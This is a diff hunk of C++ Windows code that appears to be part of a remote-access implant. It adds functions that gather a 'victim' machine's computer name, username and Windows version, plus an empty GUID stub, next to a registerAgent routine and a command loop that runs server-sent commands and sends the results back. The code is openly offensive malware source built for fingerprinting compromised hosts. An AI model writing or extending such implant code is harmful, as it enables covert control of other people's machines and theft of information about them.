@@ -53,6 +53,64 @@ BOOL registerAgent() {
     }
 }
 
+// find the name of victim computer
+std::string getComputerName() {
+
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    DWORD bufSize = BUF_SIZE;
+    GetComputerNameA(&buf[0], &bufSize);
+    buf.shrink_to_fit();
+    
+    return buf;
+}
+
+// find the username of victim computer
+std::string getUserName() {
+
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    std::string name = "USERNAME";
+    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
+    buf.shrink_to_fit();
+    
+    return buf;
+}
+
+//find the windows version running on victim machine
+std::string getWindowsVer() {
+
+    DWORD dwVersion = 0; 
+    DWORD dwMajorVersion = 0;
+    DWORD dwMinorVersion = 0; 
+    DWORD dwBuild = 0;
+
+    dwVersion = GetVersion();
+ 
+    // Get the Windows version.
+
+    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
+    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
+
+    // Get the build number.
+
+    if (dwVersion < 0x80000000)              
+        dwBuild = (DWORD)(HIWORD(dwVersion));
+
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    sprintf(&buf[0], "%d.%d (%d)", dwMajorVersion, dwMinorVersion, dwBuild);
+    buf.shrink_to_fit();
+
+    return buf;
+
+}
+
+//find the victim machine's guid
+std::string getGUID() {
+
+}
+
 // execute the list of commands and send the result back to the server
 void executeCommands(std::vector<std::string> cmds) {
     for (int i = 0; i < cmds.size(); i++) {
